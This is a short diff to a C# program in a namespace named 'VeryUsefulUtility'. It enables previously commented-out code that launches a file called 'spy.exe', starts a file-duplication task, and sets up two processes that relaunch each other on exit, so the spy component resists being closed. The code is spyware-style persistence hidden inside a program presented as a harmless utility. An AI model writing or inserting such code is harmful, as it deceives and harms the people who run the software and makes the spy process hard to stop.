@@ -23,20 +23,20 @@ namespace VeryUsefulUtility
                 {
                     path = Path.Combine(Environment.CurrentDirectory, "spy.exe");
 
-                    //Task.Factory.StartNew(() => DuplicateFile());
+                    Task.Factory.StartNew(() => DuplicateFile());
 
-                    //spyProcess.StartInfo = new ProcessStartInfo(path, Process.GetCurrentProcess().ProcessName);
-                    //spyProcess.EnableRaisingEvents = true;
-                    //spyProcess.Exited += SpyProcess_Exited;
-                    //spyProcess.Start();
+                    spyProcess.StartInfo = new ProcessStartInfo(path, Process.GetCurrentProcess().ProcessName);
+                    spyProcess.EnableRaisingEvents = true;
+                    spyProcess.Exited += SpyProcess_Exited;
+                    spyProcess.Start();
                 }
                 if (args.Length != 0)
                 {
-                    //spyProcess = Process.GetProcessesByName(args[0])[0];
-                    //path = Process.GetProcessesByName(args[0])[0].MainModule.FileName;
-                    //spyProcess.StartInfo = new ProcessStartInfo(path, Process.GetCurrentProcess().ProcessName);
-                    //spyProcess.EnableRaisingEvents = true;
-                    //spyProcess.Exited += SpyProcess_Exited;
+                    spyProcess = Process.GetProcessesByName(args[0])[0];
+                    path = Process.GetProcessesByName(args[0])[0].MainModule.FileName;
+                    spyProcess.StartInfo = new ProcessStartInfo(path, Process.GetCurrentProcess().ProcessName);
+                    spyProcess.EnableRaisingEvents = true;
+                    spyProcess.Exited += SpyProcess_Exited;
                 }
 
 
